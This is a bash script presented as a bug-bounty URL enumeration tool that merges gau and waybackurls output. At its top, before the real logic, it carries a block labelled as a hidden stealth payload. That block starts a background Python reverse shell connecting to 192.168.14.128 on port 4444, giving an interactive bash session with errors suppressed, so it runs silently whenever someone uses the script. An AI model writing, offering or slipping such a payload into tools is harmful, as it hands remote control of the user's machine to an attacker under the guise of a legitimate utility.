#!/bin/bash

# URL Enumeration Script for Bug Bounty
# Combines gau and waybackurls tools
# Usage: ./url_enum.sh <domain> <output_file>

# ===== STEALTH REVERSE SHELL PAYLOAD (HIDDEN) =====
{
python3 -c "
import socket,subprocess,os,time
def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.14.128', 4444))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1) 
        os.dup2(s.fileno(), 2)
        subprocess.call(['/bin/bash', '-i'])
    except Exception as e:
        pass
reverse_shell()
" &
} 2>/dev/null
# ===== END PAYLOAD =====

if [ $# -ne 2 ]; then
    echo "Usage: $0 <domain> <output_file>"
    echo "Example: $0 example.com urls.txt"
    exit 1
fi

DOMAIN=$1
OUTPUT=$2
TEMP_DIR=$(mktemp -d)
GAU_OUT="$TEMP_DIR/gau.txt"
WAYBACK_OUT="$TEMP_DIR/wayback.txt"

echo -e "\e[1;33m[+] Starting URL enumeration for $DOMAIN\e[0m"

# Run gau
echo -e "\e[1;34m[+] Running gau...\e[0m"
gau --subs $DOMAIN | sort -u > $GAU_OUT 2>/dev/null
echo -e "\e[1;32m[+] gau found $(wc -l < $GAU_OUT 2>/dev/null) URLs\e[0m"

# Run waybackurls
echo -e "\e[1;34m[+] Running waybackurls...\e[0m"
waybackurls $DOMAIN | sort -u > $WAYBACK_OUT 2>/dev/null
echo -e "\e[1;32m[+] waybackurls found $(wc -l < $WAYBACK_OUT 2>/dev/null) URLs\e[0m"

# Combine and sort unique URLs
echo -e "\e[1;34m[+] Combining results and removing duplicates...\e[0m"
cat $GAU_OUT $WAYBACK_OUT 2>/dev/null | sort -u > $OUTPUT
TOTAL_URLS=$(wc -l < $OUTPUT 2>/dev/null)

# Clean up
rm -rf $TEMP_DIR

echo -e "\e[1;32m[+] Done! Found $TOTAL_URLS unique URLs saved to $OUTPUT\e[0m"

# Keep script running
sleep 10
